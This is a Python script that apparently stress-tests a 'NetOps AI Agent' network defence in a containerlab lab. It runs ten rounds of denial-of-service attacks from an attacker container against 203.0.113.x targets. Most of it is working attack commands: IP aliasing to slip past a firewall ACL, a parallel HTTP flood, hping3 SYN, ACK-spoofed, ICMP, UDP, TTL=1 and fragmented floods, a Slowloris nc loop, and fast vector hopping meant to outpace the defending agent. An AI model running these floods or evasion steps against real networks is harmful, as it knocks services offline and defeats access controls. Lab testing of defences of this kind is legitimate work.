#!/usr/bin/env python3
"""
NetOps AI Agent Live Attack Stress Test Suite (Comprehensive 10-Round Edition)

Includes:
- Round 0: Initial Probing & Defense Mechanism Detection
- Round 1: Defense Evasion: Dynamic IP Aliasing & Rotation
- Round 2: Application Layer: High-Concurrency HTTP Request Storm
- Round 3: Transport Layer: High-Frequency TCP SYN Flood
- Round 4: Bandwidth Exhaustion: 150 Mbps Blast vs 50 Mbps WAN Bottleneck
- Round 5: Multi-Target Hybrid Protocol Storm (SYN + UDP + ICMP)
- Round 6: Low & Slow: Slowloris HTTP Connection Pool Starvation (0% TC drop)
- Round 7: L4 Conntrack Stress: TCP ACK Flood with Random Spoofed Sources
- Round 8: Router Control Plane: TTL=1 Traceroute CPU Starvation Storm
- Round 9: L3/L4 Evasion: Fragmented UDP Flood (Bypassing Port ACLs)
- Round 10: Adversarial Dynamic Vector Hopping (Fast Vector Rotation every 5s)
- Recovery & Audit: Buffer drain check, reachability test, and firewall state inspection
"""
import time
import subprocess
import json
import datetime
import os

LOG_DIR = "/home/zbr/Containerlab/containerlab/attack_logs"
LOG_FILE = os.path.join(LOG_DIR, "attack_live_execution.log")
REPORT_FILE = os.path.join(LOG_DIR, "attack_live_report.json")
NETOPS_DIR = "/mnt/e/netops-ai-agent/attack_logs"

def log(msg):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    formatted = f"[{ts}] {msg}"
    print(formatted, flush=True)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(formatted + "\n")
    except Exception:
        pass

def exec_cmd(cmd, timeout=35):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return res.returncode, res.stdout.strip(), res.stderr.strip()
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"

def exec_in_attacker(cmd, timeout=35):
    docker_cmd = f"docker exec clab-clos5-attacker {cmd}"
    return exec_cmd(docker_cmd, timeout)

def get_tc_stats():
    ret, out, err = exec_cmd("docker exec clab-clos5-ext-router tc -s qdisc show dev eth1")
    dropped = "N/A"
    overlimits = "N/A"
    for line in out.splitlines():
        if "dropped" in line:
            parts = line.split()
            for i, p in enumerate(parts):
                if p == "dropped":
                    dropped = parts[i+1].rstrip(",")
                if p == "overlimits":
                    overlimits = parts[i+1]
    return {"dropped": dropped, "overlimits": overlimits, "raw": out}

def get_fw_stats():
    ret, out, err = exec_cmd("docker exec clab-clos5-ext-router iptables -L FORWARD -v -n")
    return out

def get_ping_stats(target="203.0.113.10", count=4):
    ret, out, err = exec_in_attacker(f"ping -c {count} -W 1 {target}")
    loss = "100%"
    rtt_stats = "N/A"
    for line in out.splitlines():
        if "packet loss" in line:
            parts = line.split(",")
            for p in parts:
                if "packet loss" in p:
                    loss = p.strip()
        if "min/avg/max" in line or "round-trip" in line:
            rtt_stats = line.split("=")[-1].strip()
    return {"loss": loss, "rtt": rtt_stats, "raw": out}

def check_http_status(target="203.0.113.10", timeout=3):
    t0 = time.time()
    ret, out, err = exec_in_attacker(f"wget -q -T {timeout} -O /dev/null http://{target}")
    elapsed_ms = round((time.time() - t0) * 1000, 2)
    status = "HTTP_OK (200)" if ret == 0 else f"HTTP_FAIL (ret={ret})"
    return {"status": status, "latency_ms": elapsed_ms}

def main():
    os.makedirs(LOG_DIR, exist_ok=True)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n\n=================================================================\n")
        f.write(f"=== NetOps AI Agent Live Attack Stress Test Run Started at {datetime.datetime.now()} ===\n")
        f.write(f"=================================================================\n\n")

    report = {
        "test_name": "Full Multi-Vector Attack Stress Test with Evasion & Realistic WAN Limits (10 Rounds)",
        "timestamp": datetime.datetime.now().isoformat(),
        "environment": {
            "wan_rate": "50mbit",
            "wan_delay": "8ms +- 1ms (~24ms RTT)",
            "queue_limit": "32k buffer",
            "firewall_on_ext_router": "Active ACL"
        },
        "rounds": []
    }

    log("=================================================================")
    log(">>> STARTING LIVE MULTI-VECTOR ATTACK STRESS TEST (10 ROUNDS) <<<")
    log("Attacker Node: clab-clos5-attacker")
    log("Target VIPs: 203.0.113.10 (h1 Web/iperf3), 203.0.113.40 (h4)")
    log("WAN Constraint: 50 Mbps Bandwidth Bottleneck, ~24ms RTT Delay")
    log("=================================================================\n")

    # STEP 0: AUDIT CURRENT FIREWALL & INITIAL PROBE
    log("[ROUND 0] Initial Probing & Defense Mechanism Detection...")
    fw_initial = get_fw_stats()
    log(f"  [Firewall State on ext-router]:\n{fw_initial}")
    
    # Try ping with default IP 192.168.100.2
    exec_in_attacker("ip route replace 203.0.113.0/24 via 192.168.100.1 dev eth1 src 192.168.100.2")
    p0_ping = get_ping_stats("203.0.113.10", count=3)
    log(f"  [Probe from 192.168.100.2]: Loss = {p0_ping['loss']}, RTT = {p0_ping['rtt']}")
    if "100%" in p0_ping['loss']:
        log("  [!] Target is UNREACHABLE from 192.168.100.2 (Firewall ACL drop confirmed!).")
    report["rounds"].append({
        "round": 0,
        "name": "Firewall Detection & Initial Probe",
        "default_ip_ping": p0_ping
    })

    # ROUND 1: ATTACKER EVASION VIA DYNAMIC IP ROTATION
    log("\n-----------------------------------------------------------------")
    log("[ROUND 1] Defense Evasion: Dynamic IP Aliasing & Rotation")
    log("Attacker Action: Generating alias IPs 192.168.100.66, 192.168.100.77, 192.168.100.88")
    exec_in_attacker("ip addr add 192.168.100.66/24 dev eth1 2>/dev/null || true")
    exec_in_attacker("ip addr add 192.168.100.77/24 dev eth1 2>/dev/null || true")
    exec_in_attacker("ip addr add 192.168.100.88/24 dev eth1 2>/dev/null || true")
    exec_in_attacker("ip route replace 203.0.113.0/24 via 192.168.100.1 dev eth1 src 192.168.100.66")
    
    p1_ping = get_ping_stats("203.0.113.10", count=3)
    p1_http = check_http_status("203.0.113.10")
    log(f"  [Evasion Status] Switched to 192.168.100.66 -> Ping Loss: {p1_ping['loss']}, RTT={p1_ping['rtt']}")
    log(f"  [Evasion Status] Web Service Access: {p1_http['status']} (Latency: {p1_http['latency_ms']} ms)")
    report["rounds"].append({
        "round": 1,
        "name": "IP Rotation Evasion",
        "ping": p1_ping,
        "http": p1_http
    })
    time.sleep(2)

    # ROUND 2: APPLICATION LAYER HTTP CONCURRENT FLOOD
    log("\n-----------------------------------------------------------------")
    log("[ROUND 2] Application Layer: High-Concurrency HTTP Request Storm")
    log("Goal: Overwhelm Nginx web worker processes and connection pool")
    log("Command: 35 parallel worker loops hammering HTTP GET for 15s")
    r2_start = time.time()
    
    http_flood = """for i in $(seq 1 35); do ( while true; do wget -q -T 1 -O /dev/null http://203.0.113.10; done ) & done; sleep 15; killall -9 wget 2>/dev/null"""
    exec_in_attacker(f'sh -c "{http_flood}"', timeout=25)
    
    r2_ping = get_ping_stats("203.0.113.10", count=4)
    r2_http = check_http_status("203.0.113.10")
    r2_tc = get_tc_stats()
    log(f"  [Round 2 Status] HTTP Storm completed (15s). During-attack Ping: {r2_ping['loss']}, RTT={r2_ping['rtt']}")
    log(f"  [Round 2 Status] Target Web Response: {r2_http['status']} (Latency: {r2_http['latency_ms']} ms)")
    log(f"  [Round 2 Status] TC Buffer Overlimits: {r2_tc['overlimits']}")
    report["rounds"].append({
        "round": 2,
        "name": "High-Concurrency HTTP Flood",
        "duration_sec": round(time.time() - r2_start, 2),
        "ping": r2_ping,
        "http": r2_http,
        "tc": r2_tc
    })
    time.sleep(2)

    # ROUND 3: TCP SYN FLOOD ATTACK
    log("\n-----------------------------------------------------------------")
    log("[ROUND 3] Transport Layer: High-Frequency TCP SYN Flood")
    log("Goal: Saturate SYN Backlog on port 80 and exhaust NAT connection table")
    log("Command: hping3 -S -p 80 --flood 203.0.113.10 (Duration: 15s)")
    r3_start = time.time()

    syn_cmd = """hping3 -S -p 80 --flood 203.0.113.10 >/dev/null 2>&1 & sleep 15; killall -9 hping3 2>/dev/null"""
    exec_in_attacker(f'sh -c "{syn_cmd}"', timeout=25)
    
    r3_ping = get_ping_stats("203.0.113.10", count=4)
    r3_http = check_http_status("203.0.113.10")
    r3_tc = get_tc_stats()
    log(f"  [Round 3 Status] SYN Flood executed. Ping: {r3_ping['loss']}, RTT={r3_ping['rtt']}")
    log(f"  [Round 3 Status] Target Web Responsiveness: {r3_http['status']} ({r3_http['latency_ms']} ms)")
    log(f"  [Round 3 Status] TC Buffer Overlimits: {r3_tc['overlimits']}")
    report["rounds"].append({
        "round": 3,
        "name": "TCP SYN Flood",
        "duration_sec": round(time.time() - r3_start, 2),
        "ping": r3_ping,
        "http": r3_http,
        "tc": r3_tc
    })
    time.sleep(2)

    # ROUND 4: BANDWIDTH SATURATION (150 Mbps BLAST vs 50 Mbps WAN)
    log("\n-----------------------------------------------------------------")
    log("[ROUND 4] Bandwidth Exhaustion: Overdriving 50M WAN Pipe with 150Mbps UDP Blast")
    log("Goal: Force severe link congestion, jitter, and packet drop on WAN gateway")
    log("Command: iperf3 -u -b 150M -t 15 -c 203.0.113.10")
    r4_start = time.time()

    ret, iperf_out, _ = exec_in_attacker("iperf3 -c 203.0.113.10 -t 15 -u -b 150M", timeout=25)
    r4_bitrate = "N/A"
    for line in iperf_out.splitlines():
        if "receiver" in line:
            r4_bitrate = line.strip()
    log(f"  [Round 4 iperf3 Output]: {r4_bitrate}")

    r4_ping = get_ping_stats("203.0.113.10", count=4)
    r4_http = check_http_status("203.0.113.10")
    r4_tc = get_tc_stats()
    log(f"  [Round 4 Status] Ping under 150M Flood: {r4_ping['loss']}, RTT={r4_ping['rtt']}")
    log(f"  [Round 4 Status] HTTP under Bandwidth Starvation: {r4_http['status']} ({r4_http['latency_ms']} ms)")
    log(f"  [Round 4 Status] TC Buffer Overlimits: {r4_tc['overlimits']}")
    report["rounds"].append({
        "round": 4,
        "name": "150Mbps Bandwidth Saturation",
        "duration_sec": round(time.time() - r4_start, 2),
        "iperf_output": r4_bitrate,
        "ping": r4_ping,
        "http": r4_http,
        "tc": r4_tc
    })
    time.sleep(2)

    # ROUND 5: MULTI-TARGET HYBRID PROTOCOL STORM
    log("\n-----------------------------------------------------------------")
    log("[ROUND 5] Maximum Network Stress: Multi-Target Hybrid Storm (SYN + UDP + ICMP)")
    log("Targets: 203.0.113.10 (h1 Web) + 203.0.113.40 (h4 Data Server)")
    log("Vectors: Concurrent TCP SYN 80 + UDP Flood 5201 + ICMP Flood (20s duration)")
    r5_start = time.time()

    hybrid_storm = """
    hping3 -S -p 80 --flood 203.0.113.10 >/dev/null 2>&1 &
    hping3 --udp -p 5201 --flood 203.0.113.40 >/dev/null 2>&1 &
    hping3 --icmp --flood 203.0.113.10 >/dev/null 2>&1 &
    sleep 20
    killall -9 hping3 2>/dev/null
    """
    exec_in_attacker(f'sh -c "{hybrid_storm}"', timeout=30)
    
    r5_ping_h1 = get_ping_stats("203.0.113.10", count=4)
    r5_ping_h4 = get_ping_stats("203.0.113.40", count=4)
    r5_http = check_http_status("203.0.113.10")
    r5_tc = get_tc_stats()
    log(f"  [Round 5 Status] Hybrid Storm finished (20s).")
    log(f"  [Round 5 Target h1 Status] Ping: {r5_ping_h1['loss']}, RTT={r5_ping_h1['rtt']}, HTTP: {r5_http['status']} ({r5_http['latency_ms']} ms)")
    log(f"  [Round 5 Target h4 Status] Ping: {r5_ping_h4['loss']}, RTT={r5_ping_h4['rtt']}")
    log(f"  [Round 5 TC Buffer Status] Overlimits: {r5_tc['overlimits']}")
    report["rounds"].append({
        "round": 5,
        "name": "Multi-Target Hybrid Protocol Storm",
        "duration_sec": round(time.time() - r5_start, 2),
        "target_h1_ping": r5_ping_h1,
        "target_h4_ping": r5_ping_h4,
        "http": r5_http,
        "tc": r5_tc
    })
    time.sleep(2)

    # ROUND 6: LOW & SLOW - SLOWLORIS CONNECTION EXHAUSTION
    log("\n-----------------------------------------------------------------")
    log("[ROUND 6] Low & Slow: Slowloris HTTP Connection Pool Starvation")
    log("Goal: Starve Nginx worker connections without bandwidth spikes (<50kbps, 0% TC drop)")
    log("Command: 50 persistent background trickle streams sending keepalive headers every 4s")
    r6_start = time.time()

    slowloris_cmd = """
    for i in $(seq 1 50); do
      (
        printf "GET /?id=$i HTTP/1.1\\r\\nHost: 203.0.113.10\\r\\nUser-Agent: SlowlorisProbe\\r\\nConnection: keep-alive\\r\\n"
        while true; do
          printf "X-a: %s\\r\\n" "$i"
          sleep 4
        done
      ) | nc -w 25 203.0.113.10 80 >/dev/null 2>&1 &
    done
    sleep 15
    killall -9 nc 2>/dev/null
    """
    exec_in_attacker(f'sh -c "{slowloris_cmd}"', timeout=25)

    r6_ping = get_ping_stats("203.0.113.10", count=4)
    r6_http = check_http_status("203.0.113.10", timeout=2)
    r6_tc = get_tc_stats()
    log(f"  [Round 6 Status] Slowloris finished. Ping Loss: {r6_ping['loss']}, RTT={r6_ping['rtt']}")
    log(f"  [Round 6 Status] Target Web Service: {r6_http['status']} ({r6_http['latency_ms']} ms)")
    log(f"  [Round 6 Status] TC Overlimits: {r6_tc['overlimits']} (Dropped: {r6_tc['dropped']})")
    report["rounds"].append({
        "round": 6,
        "name": "Slowloris Connection Starvation",
        "duration_sec": round(time.time() - r6_start, 2),
        "ping": r6_ping,
        "http": r6_http,
        "tc": r6_tc
    })
    time.sleep(2)

    # ROUND 7: TRANSPORT LAYER - TCP ACK FLOOD WITH RANDOM SOURCES
    log("\n-----------------------------------------------------------------")
    log("[ROUND 7] Transport Layer: TCP ACK Flood (Bypassing SYN Filter & Stressing Conntrack)")
    log("Goal: Force router conntrack table lookup on invalid ACK packets & provoke host RST storms")
    log("Command: hping3 -A -p 80 --flood --rand-source 203.0.113.10 (Duration: 15s)")
    r7_start = time.time()

    ack_flood_cmd = """hping3 -A -p 80 --flood --rand-source 203.0.113.10 >/dev/null 2>&1 & sleep 15; killall -9 hping3 2>/dev/null"""
    exec_in_attacker(f'sh -c "{ack_flood_cmd}"', timeout=25)

    r7_ping = get_ping_stats("203.0.113.10", count=4)
    r7_http = check_http_status("203.0.113.10")
    r7_tc = get_tc_stats()
    log(f"  [Round 7 Status] ACK Flood completed. Ping Loss: {r7_ping['loss']}, RTT={r7_ping['rtt']}")
    log(f"  [Round 7 Status] Target Web Responsiveness: {r7_http['status']} ({r7_http['latency_ms']} ms)")
    log(f"  [Round 7 Status] TC Overlimits: {r7_tc['overlimits']}")
    report["rounds"].append({
        "round": 7,
        "name": "TCP ACK Conntrack Flood",
        "duration_sec": round(time.time() - r7_start, 2),
        "ping": r7_ping,
        "http": r7_http,
        "tc": r7_tc
    })
    time.sleep(2)

    # ROUND 8: ROUTER CONTROL PLANE - TTL=1 TRACEROUTE STORM
    log("\n-----------------------------------------------------------------")
    log("[ROUND 8] Router Control Plane: TTL=1 ICMP/UDP Traceroute CPU Starvation")
    log("Goal: Saturate ext-router CPU slow path by forcing ICMP Time Exceeded generation")
    log("Command: hping3 --udp -p 33434 --ttl 1 --flood 203.0.113.10 (Duration: 15s)")
    r8_start = time.time()

    ttl_cmd = """hping3 --udp -p 33434 --ttl 1 --flood 203.0.113.10 >/dev/null 2>&1 & sleep 15; killall -9 hping3 2>/dev/null"""
    exec_in_attacker(f'sh -c "{ttl_cmd}"', timeout=25)

    r8_ping = get_ping_stats("203.0.113.10", count=4)
    r8_http = check_http_status("203.0.113.10")
    r8_tc = get_tc_stats()
    log(f"  [Round 8 Status] TTL=1 CPU Storm finished. Ping Loss: {r8_ping['loss']}, RTT={r8_ping['rtt']}")
    log(f"  [Round 8 Status] Target Web: {r8_http['status']} ({r8_http['latency_ms']} ms)")
    log(f"  [Round 8 Status] TC Overlimits: {r8_tc['overlimits']}")
    report["rounds"].append({
        "round": 8,
        "name": "TTL=1 Control Plane Exhaustion",
        "duration_sec": round(time.time() - r8_start, 2),
        "ping": r8_ping,
        "http": r8_http,
        "tc": r8_tc
    })
    time.sleep(2)

    # ROUND 9: L3/L4 EVASION - FRAGMENTED UDP FLOOD
    log("\n-----------------------------------------------------------------")
    log("[ROUND 9] L3/L4 Evasion: Tiny Fragmented UDP Flood (Bypassing Port ACLs)")
    log("Goal: Bypass port-specific ACLs with trailing fragments and stress ip_defrag buffer")
    log("Command: hping3 --udp -p 53 -d 2400 -f --flood 203.0.113.10 (Duration: 15s)")
    r9_start = time.time()

    frag_cmd = """hping3 --udp -p 53 -d 2400 -f --flood 203.0.113.10 >/dev/null 2>&1 & sleep 15; killall -9 hping3 2>/dev/null"""
    exec_in_attacker(f'sh -c "{frag_cmd}"', timeout=25)

    r9_ping = get_ping_stats("203.0.113.10", count=4)
    r9_http = check_http_status("203.0.113.10")
    r9_tc = get_tc_stats()
    log(f"  [Round 9 Status] Fragmented Flood finished. Ping Loss: {r9_ping['loss']}, RTT={r9_ping['rtt']}")
    log(f"  [Round 9 Status] Target Web: {r9_http['status']} ({r9_http['latency_ms']} ms)")
    log(f"  [Round 9 Status] TC Overlimits: {r9_tc['overlimits']}")
    report["rounds"].append({
        "round": 9,
        "name": "Fragmented UDP Flood",
        "duration_sec": round(time.time() - r9_start, 2),
        "ping": r9_ping,
        "http": r9_http,
        "tc": r9_tc
    })
    time.sleep(2)

    # ROUND 10: ADVERSARIAL DYNAMIC MULTI-VECTOR HOPPING
    log("\n-----------------------------------------------------------------")
    log("[ROUND 10] Adversarial Dynamic Vector Hopping (Fast Vector Rotation every 5s)")
    log("Goal: Defeat static ACL defense by cycling attack vectors faster than agent reaction window")
    r10_start = time.time()

    vectors = [
        ("Phase 1: Slowloris Connection Starvation",
         "for i in $(seq 1 40); do ( printf 'GET /?h=$i HTTP/1.1\\r\\nHost: 203.0.113.10\\r\\n\\r\\n' | nc -w 10 203.0.113.10 80 >/dev/null 2>&1 & ); done; sleep 5; killall -9 nc 2>/dev/null", 5),
        ("Phase 2: TCP ACK Flood with Random Sources",
         "hping3 -A -p 80 --flood --rand-source 203.0.113.10 >/dev/null 2>&1 & sleep 5; killall -9 hping3 2>/dev/null", 5),
        ("Phase 3: TTL=1 Traceroute CPU Storm",
         "hping3 --udp -p 33434 --ttl 1 --flood 203.0.113.10 >/dev/null 2>&1 & sleep 5; killall -9 hping3 2>/dev/null", 5),
        ("Phase 4: Fragmented UDP Flood",
         "hping3 --udp -p 53 -d 2000 -f --flood 203.0.113.10 >/dev/null 2>&1 & sleep 5; killall -9 hping3 2>/dev/null", 5),
    ]

    hopping_results = []
    for vname, vcmd, vdur in vectors:
        log(f"  >>> Vector Active: {vname} (Duration: {vdur}s)")
        exec_in_attacker(f'sh -c "{vcmd}"', timeout=vdur + 10)
        vp = get_ping_stats("203.0.113.10", count=2)
        vh = check_http_status("203.0.113.10", timeout=2)
        log(f"      [{vname}] Ping Loss: {vp['loss']}, HTTP: {vh['status']}")
        hopping_results.append({"vector": vname, "ping": vp, "http": vh})

    r10_tc = get_tc_stats()
    log(f"  [Round 10 Status] Dynamic Hopping completed. Overlimits: {r10_tc['overlimits']}")
    report["rounds"].append({
        "round": 10,
        "name": "Dynamic Multi-Vector Hopping",
        "duration_sec": round(time.time() - r10_start, 2),
        "phases": hopping_results,
        "tc": r10_tc
    })

    # FINAL AUDIT & RECOVERY
    log("\n-----------------------------------------------------------------")
    log("[AUDIT & RECOVERY] Waiting 5s for WAN buffer to drain and checking recovery...")
    time.sleep(5)
    rec_ping = get_ping_stats("203.0.113.10", count=4)
    rec_http = check_http_status("203.0.113.10")
    rec_tc = get_tc_stats()
    fw_final = get_fw_stats()
    log(f"  [Post-Attack Ping] Loss: {rec_ping['loss']}, RTT={rec_ping['rtt']}")
    log(f"  [Post-Attack HTTP] Status: {rec_http['status']}, Latency: {rec_http['latency_ms']} ms")
    log(f"  [Post-Attack TC Buffer] Overlimits: {rec_tc['overlimits']}")
    log(f"  [Final Firewall State on ext-router]:\n{fw_final}")

    report["recovery"] = {
        "ping": rec_ping,
        "http": rec_http,
        "tc": rec_tc,
        "final_firewall_rules": fw_final
    }

    with open(REPORT_FILE, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    # Sync to Windows netops agent project directory
    exec_cmd(f"mkdir -p {NETOPS_DIR} && cp {LOG_FILE} {REPORT_FILE} {NETOPS_DIR}/")

    log("\n=================================================================")
    log("Live Attack Stress Test Suite Finished (10 Rounds Complete)!")
    log(f"  Log File (Windows): E:\\netops-ai-agent\\attack_logs\\attack_live_execution.log")
    log(f"  JSON File (Windows): E:\\netops-ai-agent\\attack_logs\\attack_live_report.json")
    log("=================================================================")

if __name__ == "__main__":
    main()
